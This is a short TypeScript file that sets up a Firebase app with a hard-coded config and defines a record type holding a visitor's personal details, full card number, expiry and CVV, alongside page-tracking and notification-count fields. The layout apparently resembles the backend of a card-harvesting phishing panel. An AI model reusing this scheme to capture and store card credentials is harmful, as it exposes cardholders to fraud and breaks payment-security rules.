import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyAdnBjhRa9ylbuywfQxEaPSwBqT9ccmVkE",
  authDomain: "sdvsvds.firebaseapp.com",
  projectId: "sdvsvds",
  storageBucket: "sdvsvds.firebasestorage.app",
  messagingSenderId: "519384112719",
  appId: "1:519384112719:web:89201d254e0d3359d9943a",
  measurementId: "G-DN7F555W5X"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

